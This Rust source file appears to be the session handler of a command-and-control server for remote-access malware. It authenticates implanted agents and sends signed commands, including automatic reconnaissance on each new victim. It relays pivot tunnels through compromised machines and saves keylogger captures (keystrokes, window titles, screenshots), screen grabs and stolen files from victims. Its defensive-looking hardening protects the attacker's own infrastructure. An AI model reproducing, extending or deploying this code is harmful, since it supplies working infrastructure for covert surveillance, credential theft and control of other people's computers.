// src/server/session.rs
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{mpsc, oneshot};
use std::net::SocketAddr;
use std::sync::atomic::{Ordering, AtomicU32};
use ed25519_dalek::{SigningKey, Signer};
use chrono::Utc;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use std::collections::HashMap;
use std::pin::Pin;
use std::future::Future;
use tracing::{info, warn, error};
use std::fs;
use std::path::Path;

use crate::common::{ClientHello, Session, SecuredCommand, CommandResponse, SharedSessions, PivotFrame, MalleableProfile};
use crate::database::{self, DbPool};
use crate::api::SharedResults;
use crate::file_transfer;
use crate::transport::{BoxedStream, C2Stream};

/// Check if a host string is in the private 172.16.0.0/12 range (172.16–31.x.x).
/// The old `starts_with("172.")` incorrectly blocked public IPs like Google's
/// 172.217.x.x range.
fn is_private_172(host: &str) -> bool {
    if !host.starts_with("172.") { return false; }
    // Parse the second octet
    let rest = &host[4..];
    if let Some(dot_pos) = rest.find('.') {
        if let Ok(second_octet) = rest[..dot_pos].parse::<u8>() {
            return (16..=31).contains(&second_octet); // 172.16.0.0/12
        }
    }
    false
}

/// Strip ANSI escape sequences and dangerous control characters from agent
/// output before printing to the server operator's terminal.
///
/// Without this, a hijacked agent (or a defender who compromised an endpoint)
/// can return malicious ANSI sequences that clear the screen, spoof fake
/// command results, inject terminal commands via OSC sequences, or hide
/// their activity from the operator.
fn sanitize_terminal_output(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\x1B' {
            // Skip ESC + everything up to the terminating letter.
            // CSI sequences: ESC [ ... <letter>
            // OSC sequences: ESC ] ... <ST or BEL>
            if let Some(&next) = chars.peek() {
                if next == '[' {
                    chars.next(); // consume '['
                    // Consume until we hit a letter (0x40..0x7E)
                    while let Some(&p) = chars.peek() {
                        chars.next();
                        if p.is_ascii_alphabetic() || p == '@' || p == '~' { break; }
                    }
                } else if next == ']' {
                    chars.next(); // consume ']'
                    // OSC: consume until BEL (0x07) or ST (ESC \)
                    while let Some(&p) = chars.peek() {
                        chars.next();
                        if p == '\x07' { break; }
                        if p == '\x1B' {
                            if chars.peek() == Some(&'\\') { chars.next(); }
                            break;
                        }
                    }
                } else {
                    chars.next(); // skip single-char escape
                }
            }
        } else if c.is_control() && c != '\n' && c != '\r' && c != '\t' {
            // Strip other control characters (BEL, BS, etc.)
            continue;
        } else {
            result.push(c);
        }
    }
    result
}
use crate::traffic::DataMolder;

/// Allocate session IDs from the database to survive server restarts.
fn next_session_id(db: &DbPool) -> u32 {
    static FALLBACK_ID: AtomicU32 = AtomicU32::new(50000);
    if let Ok(conn) = db.get() {
        if let Ok(id) = database::allocate_session_id(&conn) {
            return id;
        }
    }
    FALLBACK_ID.fetch_add(1, Ordering::Relaxed)
}

pub fn handle_connection(
    stream: BoxedStream,
    addr: SocketAddr,
    sessions: SharedSessions,
    db: DbPool,
    results: SharedResults,
    parent_id: Option<u32>
) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        let (mut reader, mut writer) = tokio::io::split(stream);
        let mut virtual_sessions: HashMap<u32, mpsc::UnboundedSender<Vec<u8>>> = HashMap::new();

        // 1. Handshake: Detect Profile & Read Hello
        // Timeout the initial read to prevent Slowloris-style attacks where an
        // attacker opens connections and sends no data, permanently holding
        // semaphore slots and blocking all legitimate agents from connecting.
        let handshake_result = tokio::time::timeout(
            std::time::Duration::from_secs(30),
            DataMolder::detect_and_recv(&mut reader)
        ).await;

        let (hello_buf, _) = match handshake_result {
            Ok(Ok(res)) => res,
            Ok(Err(e)) => {
                if e.kind() != std::io::ErrorKind::UnexpectedEof {
                    warn!("Handshake/Detection Error from {}: {}", addr, e);
                }
                return;
            }
            Err(_) => {
                warn!("Handshake timeout from {} (30s)", addr);
                return;
            }
        };
        
        let hello: ClientHello = match serde_json::from_slice(&hello_buf) {
            Ok(h) => h,
            Err(e) => { error!("JSON Error from {}: {}", addr, e); return; }
        };

        // 2. Authentication & Profile Loading
        let (signing_key, active_profile, profile_name, challenge_key_opt) = {
            let conn = match db.get() {
                Ok(c) => c,
                Err(e) => { error!("DB Connection Failed: {}", e); return; }
            };
            
            match database::get_build_info(&conn, &hello.build_id) {
                Some((key_bytes, name, profile_json_opt, ck)) => {
                    let key = match key_bytes.try_into() {
                        Ok(a) => SigningKey::from_bytes(&a),
                        Err(_) => { error!("Invalid Key in DB for {}", hello.build_id); return; }
                    };

                    let profile = if let Some(json) = profile_json_opt {
                        serde_json::from_str::<MalleableProfile>(&json).unwrap_or_else(|_| MalleableProfile::default())
                    } else {
                        MalleableProfile::default()
                    };

                    (key, profile, name, ck)
                },
                None => { warn!("Unknown Build ID from {}: {}", addr, hello.build_id); return; },
            }
        };

        // 2b. Challenge-Response Authentication
        // If the build has a challenge_key, require the agent to prove knowledge of it.
        if let Some(ref ck_bytes) = challenge_key_opt {
            use hmac::{Hmac, Mac};
            use sha2::Sha256;
            type HmacSha256 = Hmac<Sha256>;

            // Generate random 32-byte nonce
            let mut nonce_bytes = [0u8; 32];
            rand::RngCore::fill_bytes(&mut rand::rngs::OsRng, &mut nonce_bytes);
            let nonce_hex = hex::encode(&nonce_bytes);

            // Sign the nonce with the build's ed25519 key (proves server identity)
            let server_sig = signing_key.sign(nonce_hex.as_bytes());
            let server_proof = BASE64.encode(server_sig.to_bytes());

            let challenge = crate::common::HandshakeChallenge {
                nonce: nonce_hex.clone(),
                server_proof,
            };

            // Send challenge
            if let Ok(challenge_data) = serde_json::to_vec(&challenge) {
                let handshake_profile = MalleableProfile::default();
                if DataMolder::send(&mut writer, &challenge_data, &handshake_profile).await.is_err() {
                    warn!("Failed to send challenge to {}", addr);
                    return;
                }
            }

            // Read agent's HMAC response
            let resp_buf = match DataMolder::recv(&mut reader, &MalleableProfile::default()).await {
                Ok(b) => b,
                Err(_) => { warn!("No challenge response from {}", addr); return; }
            };

            let resp: crate::common::HandshakeResponse = match serde_json::from_slice(&resp_buf) {
                Ok(r) => r,
                Err(_) => { warn!("Invalid challenge response from {}", addr); return; }
            };

            // Verify HMAC: HMAC-SHA256(challenge_key, nonce || build_id)
            let mut mac = match <HmacSha256 as Mac>::new_from_slice(ck_bytes) {
                Ok(m) => m,
                Err(_) => { error!("Invalid challenge key length for {}", hello.build_id); return; }
            };
            mac.update(nonce_hex.as_bytes());
            mac.update(hello.build_id.as_bytes());

            // Decode the received HMAC from base64, then use verify_slice which
            // does a constant-time comparison internally and returns Err on any
            // mismatch — including length differences — without panicking.
            let received_raw = match BASE64.decode(resp.hmac.as_bytes()) {
                Ok(b) => b,
                Err(_) => {
                    warn!("Malformed HMAC base64 from {} for {}", addr, hello.build_id);
                    return;
                }
            };
            if mac.verify_slice(&received_raw).is_err() {
                warn!("Challenge-response FAILED for {} from {}", hello.build_id, addr);
                return;
            }

            info!("Challenge-response verified for {} from {}", hello.build_id, addr);
        }

        // 3. Register Session
        let sess_id = next_session_id(&db);
        {
            if let Ok(conn) = db.get() {
                database::log_new_session(
                    &conn, &hello.exe_id, &hello.computer_id, &hello.hostname, &hello.os,
                    &addr.ip().to_string(), &hello.build_id, &profile_name
                );
            }
        }
        
        let conn_type = if let Some(pid) = parent_id { format!("Tunneled via #{}", pid) } else { "Direct".to_string() };
        
        info!(session_id = sess_id, ip = %addr.ip(), profile = %profile_name, "Session Established");
        println!("\n[+] New Session {}: {} ({}) [{}] via {}", sess_id, addr.ip(), hello.build_id, conn_type, profile_name);

        // Fire webhook notification for new session
        {
            let db_wh = db.clone();
            let hostname = hello.hostname.clone();
            let ip = addr.ip().to_string();
            let os = hello.os.clone();
            tokio::spawn(async move {
                if let Ok(conn) = db_wh.get() {
                    if let Some(webhook_url) = database::get_webhook_url(&conn) {
                        // SSRF protection: validate that the webhook URL doesn't
                        // target internal/private addresses. A compromised or
                        // malicious operator could change the webhook to scan the
                        // C2 server's internal network or hit cloud metadata endpoints.
                        if let Ok(url) = url::Url::parse(&webhook_url) {
                            if let Some(host) = url.host_str() {
                                // Phase 1: hostname string check (catches obvious cases)
                                let is_suspicious = host == "localhost"
                                    || host.ends_with(".internal")
                                    || host.ends_with(".local")
                                    || host == "metadata.google.internal";
                                if is_suspicious {
                                    warn!("Blocked SSRF webhook to suspicious host: {}", webhook_url);
                                    return;
                                }

                                // Phase 2: DNS resolution check. Resolves the hostname
                                // and validates every resolved IP against private ranges.
                                // This catches DNS rebinding (attacker.com → 127.0.0.1),
                                // alt IP encodings (0x7f000001, 2130706433), and IPv6
                                // mapped IPv4 (::ffff:127.0.0.1) that bypass string checks.
                                //
                                // To prevent TOCTOU / DNS rebinding, we pin the reqwest
                                // client to the validated IP via .resolve() so the HTTP
                                // connection uses exactly the address we checked.
                                let port = url.port().unwrap_or(if url.scheme() == "https" { 443 } else { 80 });
                                let lookup_host = format!("{}:{}", host, port);
                                let validated_addr = match tokio::net::lookup_host(&lookup_host).await {
                                    Ok(addrs) => {
                                        let mut first_valid: Option<std::net::SocketAddr> = None;
                                        for addr in addrs {
                                            let ip = addr.ip();
                                            let is_private_ip = match ip {
                                                std::net::IpAddr::V4(v4) => {
                                                    v4.is_loopback()
                                                    || v4.is_private()
                                                    || v4.is_link_local()
                                                    || v4.is_broadcast()
                                                    || v4.is_unspecified()
                                                    || v4.octets()[0] == 169 && v4.octets()[1] == 254 // link-local
                                                }
                                                std::net::IpAddr::V6(v6) => {
                                                    v6.is_loopback()
                                                    || v6.is_unspecified()
                                                    // Check for IPv6-mapped IPv4 private addresses
                                                    || v6.to_ipv4_mapped().map(|v4| {
                                                        v4.is_loopback() || v4.is_private() || v4.is_link_local()
                                                    }).unwrap_or(false)
                                                }
                                            };
                                            if is_private_ip {
                                                warn!("Blocked SSRF webhook: {} resolves to private IP {}", webhook_url, ip);
                                                return;
                                            }
                                            if first_valid.is_none() {
                                                first_valid = Some(addr);
                                            }
                                        }
                                        match first_valid {
                                            Some(addr) => addr,
                                            None => { warn!("Webhook DNS returned no addresses for {}", host); return; }
                                        }
                                    }
                                    Err(e) => {
                                        warn!("Webhook DNS resolution failed for {}: {}", host, e);
                                        return;
                                    }
                                };

                                // Pin the HTTP client to the validated IP address.
                                // reqwest::resolve() overrides DNS for the given host,
                                // so even if the domain's DNS changes between our check
                                // and the TCP connect, we use the address we validated.
                                let host_owned = host.to_string();
                                let client = match reqwest::Client::builder()
                                    .resolve(&host_owned, validated_addr)
                                    .timeout(std::time::Duration::from_secs(5))
                                    .build()
                                {
                                    Ok(c) => c,
                                    Err(e) => {
                                        warn!("Failed to build webhook client: {}", e);
                                        return;
                                    }
                                };

                                let payload = serde_json::json!({
                                    "event": "new_session",
                                    "session_id": sess_id,
                                    "hostname": hostname,
                                    "ip": ip,
                                    "os": os,
                                    "text": format!("New session #{}: {} ({}) [{}]", sess_id, hostname, ip, os),
                                });
                                let _ = client
                                    .post(&webhook_url)
                                    .json(&payload)
                                    .send()
                                    .await;
                            }  // if let Some(host)
                        }  // if let Ok(url)
                    }  // if let Some(webhook_url)
                }  // if let Ok(conn)
            });
        }

        // Command channel: unbounded because callers span many async contexts.
        // Backpressure is applied at the HTTP layer via MAX_QUEUED_COMMANDS.
        let (tx, mut rx) = mpsc::unbounded_channel::<(String, Option<oneshot::Sender<u64>>)>();
        // Data channel: bounded to prevent OOM from slow consumers or
        // Slowloris-style attacks that trickle data while the server pushes.
        let (v_tx, mut v_rx) = mpsc::channel::<(u32, Vec<u8>)>(64);
        
        let last_seen = std::sync::Arc::new(std::sync::atomic::AtomicI64::new(chrono::Utc::now().timestamp()));
        
        let tx_recon = tx.clone(); // Clone before move into Session
        
        sessions.insert(sess_id, Session {
            id: sess_id, computer_id: hello.computer_id, addr, hostname: hello.hostname,
            os: hello.os, tx, signing_key: signing_key.clone(), parent_id,
            last_seen: last_seen.clone(),
        });

        // 3b. Auto-recon: fire saved commands on new session
        {
            let db_recon = db.clone();
            tokio::spawn(async move {
                // Small delay so the agent's command loop is ready
                tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                if let Ok(conn) = db_recon.get() {
                    let commands = database::get_auto_recon(&conn);
                    for cmd in commands {
                        let _ = tx_recon.send((cmd, None));
                        // Stagger commands slightly
                        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                    }
                }
            });
        }

        let mut counter = 1u64;

        // 4. Main Loop
        loop {
            tokio::select! {
                // A. Send Command
                Some((cmd_txt, callback)) = rx.recv() => {
                    let mut cmd = SecuredCommand {
                        session_id: "sess".to_string(), counter, nonce: rand::random(),
                        timestamp: Utc::now(), command: cmd_txt.clone(), signature: String::new()
                    };
                    
                    let log_txt = cmd_txt.clone();
                    let db_inner = db.clone();
                    tokio::task::spawn_blocking(move || {
                        match db_inner.get() {
                            Ok(conn) => database::log_command(&conn, sess_id, counter, &log_txt),
                            Err(e) => error!(session_id = sess_id, error = %e, "Failed to log command"),
                        }
                    });

                    info!(session_id = sess_id, req_id = counter, "Sending Command");

                    let sig = signing_key.sign(&cmd.get_signable_bytes());
                    cmd.signature = BASE64.encode(sig.to_bytes());
                    
                    let j = match serde_json::to_vec(&cmd) {
                        Ok(data) => data,
                        Err(e) => {
                            error!("Serialization failure for session {}: {}", sess_id, e);
                            continue;
                        }
                    };
                    
                    if DataMolder::send(&mut writer, &j, &active_profile).await.is_err() { break; }
                    
                    if let Some(cb) = callback { let _ = cb.send(counter); }
                    counter += 1;
                }

                // B. Receive Data
                res = DataMolder::recv(&mut reader, &active_profile) => {
                    match res {
                        Ok(b) => {
                            // Update heartbeat timestamp
                            last_seen.store(chrono::Utc::now().timestamp(), std::sync::atomic::Ordering::Relaxed);
                            if let Ok(frame) = serde_json::from_slice::<PivotFrame>(&b) {
                                let child_id = frame.source;
                                if let Some(v_sender) = virtual_sessions.get(&child_id) {
                                    if !frame.data.is_empty() { let _ = v_sender.send(frame.data); }
                                } else {
                                    // New Pivot Logic — cap to prevent resource exhaustion
                                    // from a compromised agent flooding with fake child_ids.
                                    const MAX_VIRTUAL_SESSIONS: usize = 64;
                                    if virtual_sessions.len() >= MAX_VIRTUAL_SESSIONS {
                                        warn!(parent = sess_id, "Pivot limit reached ({}), ignoring child {}", MAX_VIRTUAL_SESSIONS, child_id);
                                        continue;
                                    }

                                    let mut real_addr = addr;
                                    if !frame.metadata.is_empty() {
                                        if let Ok(parsed_ip) = frame.metadata.parse::<SocketAddr>() { real_addr = parsed_ip; }
                                    }
                                    info!(parent = sess_id, child = child_id, "New Pivot");
                                    println!("[+] New Pivot: Child #{} via #{}", child_id, sess_id);
                                    
                                    let (server_half, bridge_half) = tokio::io::duplex(4096);
                                    let (child_tx, mut child_rx) = mpsc::unbounded_channel::<Vec<u8>>();
                                    virtual_sessions.insert(child_id, child_tx.clone());
                                    
                                    if !frame.data.is_empty() { let _ = child_tx.send(frame.data); }
                                    let v_tx_clone = v_tx.clone();
                                    
                                    tokio::spawn(async move {
                                        let (mut b_read, mut b_write) = tokio::io::split(bridge_half);
                                        let mut buf = [0u8; 4096];
                                        loop {
                                            tokio::select! {
                                                n = b_read.read(&mut buf) => match n {
                                                    Ok(n) if n > 0 => { let _ = v_tx_clone.send((child_id, buf[..n].to_vec())).await; },
                                                    _ => break,
                                                },
                                                Some(d) = child_rx.recv() => { if b_write.write_all(&d).await.is_err() { break; } }
                                            }
                                        }
                                    });

                                    let (s_c, d_c, r_c) = (sessions.clone(), db.clone(), results.clone());
                                    tokio::spawn(async move {
                                        handle_connection(C2Stream::Virtual(server_half), real_addr, s_c, d_c, r_c, Some(sess_id)).await;
                                    });
                                }
                                continue;
                            }
                            if let Ok(r) = serde_json::from_slice::<CommandResponse>(&b) {
                                process_response(sess_id, r, &results, &db).await;
                            }
                        }
                        Err(_) => break,
                    }
                }
                
                // C. Pivot Write
                Some((target, data)) = v_rx.recv() => {
                    let frame = PivotFrame { stream_id: 0, destination: target, source: 0, data, metadata: String::new() };
                    if let Ok(j) = serde_json::to_vec(&frame) {
                        if DataMolder::send(&mut writer, &j, &active_profile).await.is_err() { break; }
                    }
                }
            }
        }
        sessions.remove(&sess_id);
        info!(session_id = sess_id, "Session Disconnected");
        println!("\n[-] Session {} disconnected.", sess_id);
    })
}

async fn process_response(sess_id: u32, r: CommandResponse, results: &SharedResults, db: &DbPool) {
    // --- KEYLOGGER DUMP HANDLING ---
    if r.output.starts_with("KEYLOG_DUMP:") {
        let content = r.output.trim_start_matches("KEYLOG_DUMP:").to_string();
        if content.trim().is_empty() { return; }

        let sess_id_copy = sess_id;
        // Move all blocking file I/O into spawn_blocking
        let folder_result = tokio::task::spawn_blocking(move || -> Result<String, String> {
            // Include milliseconds to prevent collisions when an agent flushes
            // multiple keylog dumps within the same second. Two dumps landing
            // in the same folder would overwrite each other's screenshot files.
            let timestamp = Utc::now().format("%Y%m%d_%H%M%S_%3f").to_string();
            let folder_name = format!("keylog_{}_{}", timestamp, sess_id_copy);
            let base_path = Path::new("downloads").join(&folder_name);
            
            fs::create_dir_all(&base_path).map_err(|e| format!("mkdir: {}", e))?;

            let mut processed_entries = Vec::new();
            let mut raw_keyboard_text = String::new();

            for (index, line) in content.lines().enumerate() {
                if line.trim().is_empty() { continue; }
                if let Ok(mut entry) = serde_json::from_str::<serde_json::Value>(line) {
                    if entry["type"] == "window_change" {
                        if let Some(title) = entry["data"]["title"].as_str() {
                            raw_keyboard_text.push_str(&format!("\n\n[Title: {}]\n", title));
                        }
                    }
                    if entry["type"] == "keystroke" {
                        if let Some(key) = entry["data"]["key"].as_str() {
                            raw_keyboard_text.push_str(key);
                        }
                    }
                    if entry["type"] == "screenshot" {
                        if let Some(b64_str) = entry["data"]["image_b64"].as_str() {
                            if let Ok(bytes) = BASE64.decode(b64_str) {
                                let raw_kind = entry["data"]["kind"].as_str().unwrap_or("unknown");
                                let kind: String = raw_kind.chars()
                                    .filter(|c| c.is_alphanumeric() || *c == '_' || *c == '-')
                                    .take(32).collect();
                                let kind = if kind.is_empty() { "unknown".to_string() } else { kind };
                                // Sanitize timestamp: strip ALL characters except alphanumerics,
                                // hyphens, and underscores. The old code only replaced : and .
                                // but left / and \ intact. Path::join with an absolute path
                                // (e.g. "/etc/cron.d/evil") REPLACES the base entirely,
                                // giving a compromised agent arbitrary file write on the C2.
                                // Extract timestamp — JSON timestamps can be strings
                                // ("2024-01-15T10:30:00") or integers (Unix epoch).
                                // as_str() returns None for integers, causing all
                                // screenshots to collide on filename "0".
                                let raw_ts = &entry["timestamp"];
                                let ts_str = if let Some(s) = raw_ts.as_str() {
                                    s.to_string()
                                } else if let Some(n) = raw_ts.as_i64() {
                                    n.to_string()
                                } else if let Some(f) = raw_ts.as_f64() {
                                    format!("{:.0}", f)
                                } else {
                                    "0".to_string()
                                };
                                let img_ts: String = ts_str
                                    .chars()
                                    .filter(|c| c.is_alphanumeric() || *c == '-' || *c == '_')
                                    .take(64)
                                    .collect();
                                let img_ts = if img_ts.is_empty() { "0".to_string() } else { img_ts };
                                let img_filename = format!("{}_img_{}_{}.png", img_ts, index, kind);
                                if fs::write(base_path.join(&img_filename), bytes).is_ok() {
                                    if let Some(obj) = entry["data"].as_object_mut() {
                                        obj.remove("image_b64");
                                        obj.insert("saved_file".to_string(), serde_json::json!(img_filename));
                                    }
                                }
                            }
                        }
                    }
                    processed_entries.push(entry);
                }
            }

            let _ = fs::write(base_path.join("raw_keyboard.txt"), raw_keyboard_text);
            let _ = fs::write(base_path.join("session_log.json"), serde_json::to_string_pretty(&processed_entries).unwrap_or_default());
            Ok(folder_name)
        }).await;

        let msg = match folder_result {
            Ok(Ok(folder_name)) => {
                info!(sess_id, folder = %folder_name, "Keylogs Processed");
                format!("Keylogs extracted to: downloads/{}", folder_name)
            }
            _ => "Keylog extraction failed".to_string(),
        };
        println!("\n[+] {}", msg);
        
        let mut modified_response = r.clone();
        modified_response.output = msg;
        let log_output = modified_response.output.clone();
        let log_error = modified_response.error.clone();

        results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), modified_response);
        let db_inner = db.clone();
        tokio::task::spawn_blocking(move || {
            if let Ok(conn) = db_inner.get() {
                database::save_client_output(&conn, sess_id, r.request_id, &log_output, &log_error);
            }
        });
        return;
    }

    // --- SCREENSHOT DUMP HANDLING ---
    if r.output.starts_with("SCREENSHOT_DUMP:") {
        let content = r.output.trim_start_matches("SCREENSHOT_DUMP:").to_string();
        let sess_id_copy = sess_id;

        let screenshot_result = tokio::task::spawn_blocking(move || -> Result<(String, usize), String> {
            let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
            let folder_name = format!("screenshots_{}_{}", timestamp, sess_id_copy);
            let base_path = Path::new("downloads").join(&folder_name);
            fs::create_dir_all(&base_path).map_err(|e| e.to_string())?;

            let mut count = 0;
            // Use typed deserialization instead of generic serde_json::Value.
            // For multi-monitor screenshots with base64 frames, the generic
            // JSON AST inflates memory 5-10x (every key/value is a separate
            // heap allocation). Typed structs borrow strings from the source.
            #[derive(serde::Deserialize)]
            struct ScreenshotEntry<'a> {
                monitor_index: Option<u64>,
                #[serde(borrow)]
                b64: Option<&'a str>,
            }
            if let Ok(entries) = serde_json::from_str::<Vec<ScreenshotEntry>>(&content) {
                // Track how many frames we've seen per monitor index so
                // multiple historical frames for the same monitor don't
                // overwrite each other (only the last one would survive).
                let mut frame_counts: std::collections::HashMap<u64, u32> = std::collections::HashMap::new();
                for entry in entries {
                    if let (Some(idx), Some(b64)) = (entry.monitor_index, entry.b64) {
                        if let Ok(bytes) = BASE64.decode(b64) {
                            let frame = frame_counts.entry(idx).or_insert(0);
                            let filename = if *frame == 0 {
                                format!("monitor_{}.png", idx)
                            } else {
                                format!("monitor_{}_frame{}.png", idx, frame)
                            };
                            *frame += 1;
                            if fs::write(base_path.join(&filename), bytes).is_ok() {
                                count += 1;
                            }
                        }
                    }
                }
            }
            Ok((folder_name, count))
        }).await;

        let msg = match screenshot_result {
            Ok(Ok((folder_name, count))) => format!("Saved {} screenshots to: downloads/{}", count, folder_name),
            _ => "Screenshot extraction failed".to_string(),
        };
        println!("\n[+] {}", msg);

        let mut modified_response = r.clone();
        modified_response.output = msg;
        let log_output = modified_response.output.clone();
        let log_error = modified_response.error.clone();

        results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), modified_response);
        let db_inner = db.clone();
        tokio::task::spawn_blocking(move || {
            if let Ok(conn) = db_inner.get() {
                database::save_client_output(&conn, sess_id, r.request_id, &log_output, &log_error);
            }
        });
        return;
    }
    // -------------------------------------

    if r.output.starts_with("file:data|") {
        let parts: Vec<&str> = r.output.splitn(4, '|').collect();
        if parts.len() == 4 {
            match file_transfer::save_download_with_metadata(sess_id, parts[1], parts[3], parts[2]) {
                Ok(m) => {
                    info!(sess_id, file = parts[1], "File Downloaded Successfully");
                    println!("\n[+] Single Download: {}", m);
                },
                Err(e) => {
                    error!(sess_id, file = parts[1], error = %e, "File Download Failed");
                    println!("\n[-] Save Error: {}", e);
                }
            }
        }
        return;
    } 
    
    if r.output.starts_with("file:data_batch|") {
        let parts: Vec<&str> = r.output.splitn(6, '|').collect();
        if parts.len() == 6 {
            let (batch_ts, root, rel, b64) = (parts[1], parts[2], parts[3], parts[5]);
            match file_transfer::save_batch_file(batch_ts, sess_id, root, rel, b64) {
                Ok(_) => { file_transfer::append_progress(batch_ts, sess_id, root, &format!("Downloaded: {}", rel)); },
                Err(e) => { file_transfer::append_progress(batch_ts, sess_id, root, &format!("FAILED: {} - {}", rel, e)); }
            }
        }
        return;
    }

    if r.output.starts_with("file:report_batch|") {
        let parts: Vec<&str> = r.output.splitn(4, '|').collect();
        if parts.len() == 4 {
            let (batch_ts, root, json) = (parts[1], parts[2], parts[3]);
            match file_transfer::save_batch_report(batch_ts, sess_id, root, json) {
                Ok(path) => { 
                    info!(sess_id, batch = root, report = path, "Batch Download Complete");
                    println!("\n[+] Batch Complete: {}\n[+] Report: {}", root, path); 
                },
                Err(e) => println!("[-] Report Error: {}", e),
            }
        }
        return;
    }

    // --- JOB SYSTEM: Streamed output chunks ---
    if r.output.starts_with("JOB_STREAM:") {
        // Format: JOB_STREAM:<job_id>|<line>
        if let Some(rest) = r.output.strip_prefix("JOB_STREAM:") {
            if let Some((job_id_str, line)) = rest.split_once('|') {
                info!(sess_id, job_id = job_id_str, "Job Stream");
                println!("\n[Job {} Sess {}] {}", job_id_str, sess_id, line);
            }
        }
        // Don't store stream chunks in the results map (they're ephemeral)
        return;
    }

    // --- JOB SYSTEM: Final output ---
    if r.output.starts_with("JOB_FINAL:") {
        // Format: JOB_FINAL:<job_id>|<final_output>
        if let Some(rest) = r.output.strip_prefix("JOB_FINAL:") {
            if let Some((job_id_str, output)) = rest.split_once('|') {
                info!(sess_id, job_id = job_id_str, "Job Completed");
                println!("\n[+] Job {} (Sess {}) Completed", job_id_str, sess_id);
                // Store the final output with the cleaned output (no prefix)
                let mut clean_response = r.clone();
                clean_response.output = output.to_string();
                results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), clean_response.clone());
                let db_inner = db.clone();
                tokio::task::spawn_blocking(move || {
                    match db_inner.get() {
                        Ok(conn) => database::save_client_output(&conn, sess_id, clean_response.request_id, &clean_response.output, &clean_response.error),
                        Err(e) => error!(sess_id, req_id = clean_response.request_id, error = %e, "DB pool exhausted"),
                    }
                });
            }
        }
        return;
    }

    results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), r.clone());

    let db_inner = db.clone();
    let r_clone = r.clone();
    tokio::task::spawn_blocking(move || {
        match db_inner.get() {
            Ok(conn) => database::save_client_output(&conn, sess_id, r_clone.request_id, &r_clone.output, &r_clone.error),
            Err(e) => error!(sess_id, req_id = r_clone.request_id, error = %e, "DB pool exhausted, output lost"),
        }
    });

    if !r.error.is_empty() {
        error!(sess_id, req_id = r.request_id, exit_code = r.exit_code, error = %r.error, "Command Failed");
        println!("\n[-] Session {} Error (Exit {}): {}", sess_id, r.exit_code, r.error);
    } else if !r.output.trim().is_empty() {
        info!(sess_id, req_id = r.request_id, output = %r.output.trim(), "Command Output Received");
        println!("\n[Sess {} Output]\n{}", sess_id, crate::utils::strip_ansi(r.output.trim()));
    }
}
